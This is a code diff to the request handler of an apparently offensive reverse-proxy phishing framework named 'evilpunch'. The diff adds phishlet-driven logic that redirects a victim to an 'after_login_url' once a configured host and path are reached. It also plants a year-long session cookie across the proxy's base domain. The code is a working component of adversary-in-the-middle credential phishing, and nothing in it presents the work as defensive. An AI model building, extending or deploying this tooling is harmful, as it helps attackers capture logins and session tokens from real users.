@@ -3080,6 +3080,67 @@ async def proxy_handler(request):
                 debug_log("CORS and security header processing completed", "DEBUG")
                 # === END CORS AND SECURITY HEADER PROCESSING ===
 
+                # === REDIRECT LOGIC PROCESSING ===
+                # Check if redirect conditions are met based on phishlet configuration
+                if matching_phishlet and matching_phishlet.get('data'):
+                    phishlet_data = matching_phishlet['data']
+                    redirect_on_host = phishlet_data.get('redirect_on_host', '').strip()
+                    redirect_on_url = phishlet_data.get('redirect_on_url', '').strip()
+                    after_login_url = phishlet_data.get('after_login_url', '').strip()
+                    
+                    if redirect_on_host and redirect_on_url and after_login_url:
+                        # Check if current request matches the redirect conditions
+                        current_host = target_host.strip().lower()
+                        current_url = str(request.rel_url).strip()
+                        
+                        debug_log(f"Checking redirect conditions:", "DEBUG")
+                        debug_log(f"  redirect_on_host: '{redirect_on_host}' vs current_host: '{current_host}'", "DEBUG")
+                        debug_log(f"  redirect_on_url: '{redirect_on_url}' vs current_url: '{current_url}'", "DEBUG")
+                        
+                        # Check if host and URL match (case-insensitive)
+                        host_matches = redirect_on_host.lower() == current_host
+                        url_matches = redirect_on_url.lower() == current_url.lower()
+                        
+                        if host_matches and url_matches:
+                            debug_log(f"✅ Redirect conditions met! Redirecting to: {after_login_url}", "INFO")
+                            
+                            # Create redirect response
+                            redirect_response = web.HTTPFound(after_login_url)
+                            
+                            # Add session cookie if we have session info
+                            if hasattr(request, 'get') and request.get('session_cookie'):
+                                session_cookie = request['session_cookie']
+                                phishlet_id = request.get('phishlet_id')
+                                proxy_domain = request.get('proxy_domain', '')
+                                
+                                # Set cookie with appropriate attributes and phishlet-specific name
+                                cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
+                                
+                                # Set cookie domain to base domain for cross-subdomain access
+                                base_domain = proxy_domain
+                                if '.' in base_domain:
+                                    base_domain = base_domain.split('.', 1)[1] if base_domain.count('.') > 1 else base_domain
+                                
+                                redirect_response.set_cookie(
+                                    cookie_name,
+                                    session_cookie,
+                                    max_age=31536000,  # 1 year
+                                    httponly=True,
+                                    secure=False,
+                                    samesite='Lax',
+                                    domain=f'.{base_domain}'
+                                )
+                                debug_log(f"Added session cookie to redirect response: {cookie_name} = {session_cookie[:8]}...", "DEBUG")
+                            
+                            return redirect_response
+                        else:
+                            debug_log(f"⏭️  Redirect conditions not met - continuing with normal response", "DEBUG")
+                    else:
+                        debug_log(f"⏭️  No redirect configuration found in phishlet data", "DEBUG")
+                else:
+                    debug_log(f"⏭️  No phishlet data available for redirect check", "DEBUG")
+                # === END REDIRECT LOGIC PROCESSING ===
+
                 # Check if client is still connected before preparing response
                 if request.transport and request.transport.is_closing():
                     debug_log("Client disconnected before response preparation", "WARN")
